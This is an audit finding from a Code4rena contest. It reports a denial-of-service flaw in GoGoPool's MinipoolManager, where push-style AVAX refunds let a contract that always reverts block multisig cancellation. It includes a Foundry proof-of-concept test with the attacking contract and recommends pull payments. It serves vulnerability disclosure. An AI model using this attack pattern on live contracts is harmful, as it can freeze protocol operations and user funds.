# Original link
https://github.com/code-423n4/2022-12-gogopool-findings/issues/809
# Lines of code

https://github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/MinipoolManager.sol#L664


# Vulnerability details

## Impact
The `MinipoolManager._cancelMinipoolAndReturnFunds` function implements a push payment mechanism for ETH (AVAX) transfers. This function is internally called by `cancelMinipoolByMultisig` function.

A malicious contract which reverts on all plain ETH transfer can be used to prevent a multisig from canceling the Minipool. Since the Minipool now cannot move to `Canceled` state, the only state possible forward for the Minipool is the `Launched` state or just be in the `Prelaunch` state forever. Both the scenarios are completed unintentional and unexpected for the  MinipoolManager contract.

## Proof of Concept
Test case:

```solidity
contract Malicious {
	receive() external payable { revert("Not Receivable"); }
	function stakeGGP(address staking, ERC20 ggp, uint256 amount) public {
		ggp.approve(staking, amount);
		Staking(staking).stakeGGP(amount);
	}
	function createMinipool(address manager, address nodeID, uint256 avaxAssignmentRequest) public payable {
		MinipoolManager(manager).createMinipool{value: msg.value}(nodeID, 0, 0, avaxAssignmentRequest);
	}
}

contract MinipoolManagerTest is BaseTest {
	address private attacker;
	function setUp() public override {
		super.setUp();
		attacker = getActorWithTokens("attacker", MAX_AMT, MAX_AMT);
	}

	function testBug() public {
		uint256 depositAmt = 1000 ether;
		uint256 avaxAssignmentRequest = 1000 ether;
		uint128 ggpStakeAmt = 200 ether;
		address nodeID = address(1009);

		Malicious maliciousC = new Malicious();

		vm.startPrank(attacker);
		ggp.transfer(address(maliciousC), MAX_AMT);
		maliciousC.stakeGGP(address(staking), ggp, ggpStakeAmt);
		maliciousC.createMinipool{value: depositAmt}(address(minipoolMgr), nodeID, avaxAssignmentRequest);
		vm.stopPrank();

		bytes32 errorCode = "INVALID_NODEID";
		vm.prank(address(rialto));
		vm.expectRevert("ETH_TRANSFER_FAILED");
		minipoolMgr.cancelMinipoolByMultisig(nodeID, errorCode);
	}
}
```

## Tools Used
Manual review

## Recommended Mitigation Steps
The `MinipoolManager._cancelMinipoolAndReturnFunds` should implement a pull payment mechanism in which the recipient itself has to come and trigger the payment transaction. 